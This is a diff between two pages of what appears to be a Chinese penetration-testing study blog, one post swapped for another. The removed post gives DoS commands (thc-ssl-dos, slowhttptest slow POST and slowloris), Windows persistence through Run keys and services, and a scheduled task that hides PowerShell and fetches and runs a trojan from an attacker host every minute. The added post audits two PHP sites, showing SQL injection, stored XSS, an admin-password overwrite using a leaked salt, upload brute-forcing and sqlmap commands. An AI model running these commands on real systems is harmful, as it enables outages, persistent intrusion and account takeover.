@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
-<title>1.14 自启动和DOS攻击初步</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="场景一：发卡网站 后台登录：admin/wuaishare.cn\nindex.php的31行 include 'template/'.$tp.'/'.$action.&quot;.php&quot;;\n有可能文件包含漏洞\n我点击购买东西，还没付钱，抓到的数据包 1 2 3 /ajax.php?act=selKm POST gid=1 我放行之后，点击支付\n">
+<title>2.3 代码审计</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
 
-<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="1.14 自启动和DOS攻击初步">
-<meta property='og:description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
-<meta property='og:url' content='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
+<link rel="stylesheet" href="/scss/style.min.67c2cdd23260c968137443c657d1f7a9a3df6cb47c832d8909e5b1c8880a7e9c.css"><meta property='og:title' content="2.3 代码审计">
+<meta property='og:description' content="场景一：发卡网站 后台登录：admin/wuaishare.cn\nindex.php的31行 include 'template/'.$tp.'/'.$action.&quot;.php&quot;;\n有可能文件包含漏洞\n我点击购买东西，还没付钱，抓到的数据包 1 2 3 /ajax.php?act=selKm POST gid=1 我放行之后，点击支付\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-16T18:07:16&#43;08:00'/><meta property='article:modified_time' content='2025-12-16T18:07:16&#43;08:00'/>
-<meta name="twitter:title" content="1.14 自启动和DOS攻击初步">
-<meta name="twitter:description" content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-02-03T20:39:40&#43;08:00'/><meta property='article:modified_time' content='2026-02-03T20:39:40&#43;08:00'/>
+<meta name="twitter:title" content="2.3 代码审计">
+<meta name="twitter:description" content="场景一：发卡网站 后台登录：admin/wuaishare.cn\nindex.php的31行 include 'template/'.$tp.'/'.$action.&quot;.php&quot;;\n有可能文件包含漏洞\n我点击购买东西，还没付钱，抓到的数据包 1 2 3 /ajax.php?act=selKm POST gid=1 我放行之后，点击支付\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,25 +319,8 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#dos拒绝服务攻击">DOS拒绝服务攻击</a>
-      <ol>
-        <li><a href="#ssl-dos">ssl-dos</a></li>
-        <li><a href="#慢速攻击">慢速攻击</a>
-          <ol>
-            <li><a href="#slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）</a></li>
-            <li><a href="#slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）</a></li>
-          </ol>
-        </li>
-      </ol>
-    </li>
-    <li><a href="#其他内容">其他内容</a>
-      <ol>
-        <li><a href="#驱动级文件保护软件">驱动级文件保护软件</a></li>
-        <li><a href="#注册表自启动">注册表自启动</a></li>
-        <li><a href="#计划任务启动">计划任务启动</a></li>
-        <li><a href="#服务启动">服务启动</a></li>
-      </ol>
-    </li>
+    <li><a href="#场景一发卡网站">场景一：发卡网站</a></li>
+    <li><a href="#场景二非法杀猪盘网站">场景二：非法杀猪盘网站</a></li>
   </ol>
 </nav>
         </div>
@@ -360,8 +343,8 @@
                 网安
             </a>
         
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
-                渗透测试微专业
+            <a href="/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/" >
+                26寒假集训
             </a>
         
     </header>
@@ -369,7 +352,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">1.14 自启动和DOS攻击初步</a>
+            <a href="/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">2.3 代码审计</a>
         </h2>
     
         
@@ -391,7 +374,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-12-16 | 18:07</time>
+                <time class="article-time--published">2026-02-03 | 20:39</time>
             </div>
         
 
@@ -414,176 +397,213 @@
     <section class="article-content">
     
     
-    <h2 id="dos拒绝服务攻击">DOS拒绝服务攻击
-</h2><h3 id="ssl-dos">ssl-dos
-</h3><p>一般用于打击https网站，如果目标挂了CDN无效</p>
-<p>安装：执行<code>sudo apt-get install thc-ssl-dos</code>安装程序</p>
-<p>攻击：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">thc-ssl-dos <span class="o">[</span>目标ip<span class="o">]</span> <span class="m">443</span> --accept
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="慢速攻击">慢速攻击
-</h3><p><strong>安装程序：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt-get install openssl
-</span></span><span class="line"><span class="cl">sudo apt-get install libssl-dev
-</span></span><span class="line"><span class="cl">sudo apt-get install slowhttptest
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）
-</h4><p><strong>攻击命令：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -B -g -o body_states -i <span class="m">110</span> -r <span class="m">200</span> -s <span class="m">8192</span> -t FAKEVERB -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">10</span> -p <span class="m">3</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>参数解释：</strong></p>
-<div class="table-wrapper"><table>
-  <thead>
-      <tr>
-          <th>参数</th>
-          <th>英文全称/含义</th>
-          <th>具体作用</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>-c 2000</code></td>
-          <td><code>connections</code>（并发连接数）</td>
-          <td>指定向目标服务器同时建立<strong>2000个并发HTTP连接</strong>，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。</td>
-      </tr>
-      <tr>
-          <td><code>-B</code></td>
-          <td><code>Body attack</code>（慢POST攻击）</td>
-          <td>明确攻击类型为<strong>Slow POST（慢POST攻击）</strong>（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。</td>
-      </tr>
-      <tr>
-          <td><code>-g</code></td>
-          <td><code>generate statistics</code>（生成统计日志）</td>
-          <td>启用日志记录功能，会生成<strong>CSV格式的原始数据文件</strong>和<strong>HTML格式的可视化报告</strong>，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。</td>
-      </tr>
-      <tr>
-          <td><code>-o body_states</code></td>
-          <td><code>output prefix</code>（输出文件前缀）</td>
-          <td>指定日志文件的前缀为<code>body_states</code>，结合<code>-g</code>参数，会生成<code>body_states.csv</code>（数据文件）和<code>body_states.html</code>（可视化报告）两个文件。</td>
-      </tr>
-      <tr>
-          <td><code>-i 110</code></td>
-          <td><code>interval</code>（数据块发送间隔）</td>
-          <td>指定每次发送请求体数据块之间的<strong>时间间隔为110毫秒（ms）</strong>。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。</td>
-      </tr>
-      <tr>
-          <td><code>-r 200</code></td>
-          <td><code>rate</code>（每秒新建连接数）</td>
-          <td>指定<strong>每秒向目标新建200个连接</strong>，直到达到<code>-c 2000</code>的并发连接上限（约10秒可达到2000个并发）。</td>
-      </tr>
-      <tr>
-          <td><code>-s 8192</code></td>
-          <td><code>content length size</code>（内容长度）</td>
-          <td>在HTTP请求头的<code>Content-Length</code>字段中声明<strong>预期发送8192字节（8KB）的请求体</strong>，欺骗服务器保持连接等待接收完整数据。</td>
-      </tr>
-      <tr>
-          <td><code>-t FAKEVERB</code></td>
-          <td><code>HTTP verb</code>（HTTP方法）</td>
-          <td>指定HTTP请求使用<strong>伪造的非标准方法</strong><code>FAKEVERB</code>（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。</td>
-      </tr>
-      <tr>
-          <td><code>-u http://[目标ip]</code></td>
-          <td><code>URL</code>（目标地址）</td>
-          <td>指定<strong>攻击目标的URL</strong>，需将<code>[目标ip]</code>替换为实际的服务器IP或域名。</td>
-      </tr>
-      <tr>
-          <td><code>-x 10</code></td>
-          <td><code>block size</code>（数据块长度）</td>
-          <td>指定每次向服务器发送的<strong>请求体数据块长度为10字节</strong>。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。</td>
-      </tr>
-      <tr>
-          <td><code>-p 3</code></td>
-          <td><code>probe timeout</code>（探测超时时间）</td>
-          <td>在发起正式攻击前，工具会先发送一个<strong>探测请求</strong>检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。</td>
-      </tr>
-  </tbody>
-</table></div>
-<p><strong>原理解析：</strong> 发送 POST 请求时，在请求头中声明<code>Content-Length: 8192</code>（要发 8KB 数据），然后以 <strong>10 字节 / 110ms</strong> 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。</p>
-<h4 id="slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）
-</h4><p><strong>攻击命令：</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -H -g -o my_header_states -i <span class="m">10</span> -r <span class="m">1000</span> -s <span class="m">8192</span> -t GET -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">24</span> -p <span class="m">3</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>原理解析：</strong> 发送 GET 请求时，故意 <strong>逐个缓慢发送 HTTP 请求头字段</strong> （如<code>Host:</code>、<code>User-Agent:</code>、<code>Accept:</code>等），每个字段大小为 24 字节，发送间隔仅 10ms（看似快，但对服务器的连接处理机制而言，仍足够慢以占用连接），且不发送请求头的结束标记（<code>\r\n\r\n</code>），让服务器认为请求头还在传输中，从而一直保持连接等待完整的请求头。</p>
-<h2 id="其他内容">其他内容
-</h2><h3 id="驱动级文件保护软件">驱动级文件保护软件
-</h3><p>使用 **Easy File Locker ** 可以对我们的文件进行驱动级的保护和隐藏，当然包括我们放在目标上的木马程序。</p>
-<p>当配置完毕（或我们自己中招）后，我们可以检查下面两个文件夹看看是否真的生效了</p>
-<p><code>C:/Windows/xlfks.xxx</code>(包括但不限于dat、dll、ini、log&hellip;&hellip;)</p>
-<p><code>C:/Windows/system32/drivers/xlkfs.sys</code></p>
-<p>如果检查出上面两个文件就说明是驱动级的文件隐藏</p>
-<hr>
-<p><strong>如何清除：</strong></p>
+    <h2 id="场景一发卡网站">场景一：发卡网站
+</h2><blockquote>
+<p>后台登录：admin/wuaishare.cn</p>
+</blockquote>
 <ol>
-<li>查询服务状态<code>sc qc xlkfs</code></li>
-<li>停止服务<code>net stop xlkfs</code></li>
-<li>删除服务<code>sc delete xlkfs</code></li>
-<li>找到上面的两位个文件残余并删除</li>
-<li>删除木马程序</li>
+<li>index.php的31行</li>
 </ol>
-<h3 id="注册表自启动">注册表自启动
-</h3><p><code>Win+R</code>输入regedit回车打开注册表</p>
-<p><strong>路径一：</strong></p>
-<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p>
-<p><strong>路径二：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
-<p><strong>路径三：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
-<p><strong>路径四：</strong></p>
-<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
-<p><strong>路径五：</strong></p>
-<p>找到路径为<code>HKEY_CURRENT_USER\Environment</code></p>
-<p>**说明：**路径三、四、五内的条目都是Windows在登录时会执行的任务</p>
-<p>右键新建字符串值，在数据中输入要自启动的文件路径和启动参数</p>
-<h3 id="计划任务启动">计划任务启动
-</h3><div class="highlight"><div class="chroma">
+<p><code>include 'template/'.$tp.'/'.$action.&quot;.php&quot;;</code></p>
+<p>有可能文件包含漏洞</p>
+<hr>
+<ol start="2">
+<li>我点击购买东西，还没付钱，抓到的数据包</li>
+</ol>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">1</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;示例名称&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe -nop -w hidden
-</span></span></span><span class="line"><span class="cl"><span class="s2">-c \&#34;</span><span class="n">IEX</span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;http://[攻击机ip]/
-</span></span></span><span class="line"><span class="cl"><span class="s2">[木马文件]&#34;</span><span class="p">\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;))\&#34;&#34;
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">/ajax.php?act=selKm
+</span></span></span><span class="line"><span class="cl"><span class="err">POST
+</span></span></span><span class="line"><span class="cl"><span class="err">gid=1
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>上面的代码会让目标每分钟在后台下载并执行攻击者的木马程序</p>
-<h3 id="服务启动">服务启动
-</h3><p>增加一个服务</p>
-<p><code>sc create &quot;示例名称&quot; binpath= &quot;cmd /c start 具体命令&quot;</code></p>
-<p>设置服务描述</p>
-<p><code>sc description 示例名称 &quot;示例描述&quot;</code></p>
-<p>设置自动启动</p>
-<p><code>sc config 示例名称 start= auto</code></p>
-<p>开启服务</p>
-<p><code>net start 示例名称</code></p>
-
+</div><p>我放行之后，点击支付</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">/ajax.php?act=create
+</span></span></span><span class="line"><span class="cl"><span class="err">POST 
+</span></span></span><span class="line"><span class="cl"><span class="err">out_trade_no=2026131049390902&amp;gid=1&amp;money=5&amp;rel=123123123&amp;type=wxpay&amp;number=1
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>此时后台可以看到</p>
+<hr>
+<ol start="3">
+<li>发现ajax.php的42行</li>
+</ol>
+<p><code>$out_trade_no = $_POST['out_trade_no'];</code></p>
+<p>参数没有进行过滤</p>
+<hr>
+<ol start="4">
+<li>发现56行利用了</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into if_order(out_trade_no,gid,money,rel,benTime,type,number) 
+</span></span></span><span class="line"><span class="cl"><span class="s2">         values(&#39;</span><span class="si">{</span><span class="nv">$out_trade_no</span><span class="si">}</span><span class="s2">&#39;,</span><span class="si">{</span><span class="nv">$gid</span><span class="si">}</span><span class="s2">,</span><span class="si">{</span><span class="nv">$money</span><span class="si">}</span><span class="s2">,&#39;</span><span class="si">{</span><span class="nv">$rel</span><span class="si">}</span><span class="s2">&#39;,now(),&#39;</span><span class="si">{</span><span class="nv">$type</span><span class="si">}</span><span class="s2">&#39;,</span><span class="si">{</span><span class="nv">$number</span><span class="si">}</span><span class="s2">)&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有可能出现sql注入</p>
+<hr>
+<ol start="5">
+<li>管理员通过admin/list.php <strong>（存储型XSS：可行）</strong></li>
+</ol>
+<p>看到订单号</p>
+<p>136行发现<code>$res['out_trade_no']</code>直接从数据库取出，没有做任何过滤就放到了管理员面前</p>
+<p>和上面漏洞结合，有可能出现xss盲打 <strong>（实测有长度限制）</strong> ，但是正常进行较短语句的XSS存储型注入是没有问题 的。</p>
+<hr>
+<ol start="6">
+<li>admin/ajax.php <strong>（纵向越权：可行）</strong></li>
+</ol>
+<p>27行发现<code>$pass = md5($pass.$password_hash);</code></p>
+<p>发现密码加盐了，也就是在用户输入的密码后拼接一串字符串后再加密，因为开头引入了<code>commom.php</code>遂检查</p>
+<p>发现common.php的34行<code>$password_hash='!@#%!s!8#';</code></p>
+<hr>
+<p>159行发现<code>case 'upAdmin':</code> 用来修改管理员密码</p>
+<p>如果发送的case内容为upAdmin并且用户名admin密码为123456!@#%!s!8#并且进行md5，也就是f3b4e3b975e0484835e90514f8318e61</p>
+<p>提交到admin/ajax.php，会直接越权修改管理员密码，<strong>遂尝试：</strong></p>
+<p>直接去访问<code>/admin/ajax.php?act=upAdmin</code>出现页面非法请求</p>
+<p>因为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_REQUESTED_WITH&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;XMLHttpRequest&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span> <span class="s2">&#34;页面非法请求！&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>必须修改为POST包</p>
+<p>在请求的header上加上</p>
+<p><code>X-Requested-With:XMLHttpRequest</code></p>
+<p>还需要加上</p>
+<p><code>Content-Type: application/x-www-form-urlencoded</code></p>
+<p>否则参数无法被识别的</p>
+<p>建议使用Chrome版的Hackbar，附最终效果：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/02/03/6981ecde0af4a.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<ol start="7">
+<li>在<code>admin/clist.php</code>发现文件上传 <strong>（文件上传：可行）</strong></li>
+</ol>
+<p><code>$imgs =  upimgs($_FILES['img']);</code>在24行</p>
+<p>全局搜索upimgs函数</p>
+<p>发现<code>if/function.php</code>的141行发现这个函数</p>
+<p>发现文件上传路径<code>../assets/goodsimg/</code></p>
+<p>需要做mime检测</p>
+<p>文件命名规则 <code>当前时间.后缀名</code></p>
+<p><strong>拓展补充：</strong> 此处的时间指的是 Unix 时间戳，指的是从 <strong>1970年1月1日 00:00:00 UTC</strong> 到当前时刻所经过的秒数，可以使用这个工具计算：<a class="link" href="https://tool.lu/timestamp/"  target="_blank" rel="noopener"
+    >时间戳(Unix timestamp)转换工具</a></p>
+<p>例如发送图片之前的时间1770099184</p>
+<p>发送图片之后的时间1770099204</p>
+<p>使用burp进行暴力破解文件名</p>
+<h2 id="场景二非法杀猪盘网站">场景二：非法杀猪盘网站
+</h2><p><code>include/conn.php</code></p>
+<p>24行<code>define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//对所有传入内容进行过滤
+</span></span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;_COOKIE&#39;</span><span class="p">,</span> <span class="s1">&#39;_POST&#39;</span><span class="p">,</span> <span class="s1">&#39;_GET&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$_request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//这里$$_request意思就是“变量变量”
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//当$_request == &#39;_POST&#39;时，$$_request == ${&#39;_POST&#39;}是POST数组
+</span></span></span><span class="line"><span class="cl">    <span class="c1">//$_POST as $_key =&gt; $_value
+</span></span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$$_request</span> <span class="k">as</span> <span class="nv">$_key</span> <span class="o">=&gt;</span> <span class="nv">$_value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//1.$_key{0} 拿到$_key字符串的第一个字符
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//2.如果第一个字符不是_，就执行右侧赋值
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//3. $_key = &#39;username&#39; $$_key = $username
+</span></span></span><span class="line"><span class="cl">        <span class="c1">//4. daddslashes防止sql注入
+</span></span></span><span class="line"><span class="cl">        <span class="nv">$_key</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">!=</span> <span class="s1">&#39;_&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$$_key</span> <span class="o">=</span> <span class="nx">daddslashes</span><span class="p">(</span><span class="nv">$_value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前台登录的时候</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET /member/bin.php?act=login&amp;username=18876115599&amp;pwd=Ym3.Net&amp;remember=true
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>member/post.php</code>第5行</p>
+<p><code>$ddh=trim($_GET['ddh']); </code></p>
+<p>在32行的时候不做任何过滤直接就收录到sql语句中</p>
+<p>有可能存在sql注入</p>
+<p>构建一个满足这页面的情况</p>
+<p><code>ddh=1&amp;money=100&amp;key=2052cd88bea3f9016a0057436dbbd750</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python sqlmap.py -u &#34;http://192.168.0.104/member/post.php?ddh=1&amp;money=100&amp;key=2052cd88bea3f9016a0057436dbbd750&#34; -p ddh --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>管理员后台，账号管理的时候访问地址<code>admin/admin.php</code></p>
+<p><code>GET /admin/admin.php?clause=editinfo?id=2</code></p>
+<p>发现调用<code>119 function editinfo()</code></p>
+<p>发现有全局变量<code>global $db,$id,$LoginEdUserName;</code></p>
+<p>并且id变量直接进入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">$rs = $db-&gt;get_one(&#34;SELECT * FROM `h_admin` where id = $id&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把这个get请求保存到文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">python sqlmap.py -r 1.txt --current-db
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
@@ -645,12 +665,12 @@
             
                 
 <article class="">
-    <a href="/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.16 Linux应急响应</h2>
+            <h2 class="article-title">2.3-SP PTE模拟全WP</h2>
         </div>
     </a>
 </article>
@@ -658,12 +678,12 @@
             
                 
 <article class="">
-    <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/2.2-%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.15 DOS补充和Win应急响应</h2>
+            <h2 class="article-title">2.2 数字取证</h2>
         </div>
     </a>
 </article>
@@ -671,12 +691,12 @@
             
                 
 <article class="">
-    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
+    <a href="/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.13  更多木马程序</h2>
+            <h2 class="article-title">2.1 综合练习</h2>
         </div>
     </a>
 </article>
@@ -684,12 +704,12 @@
             
                 
 <article class="">
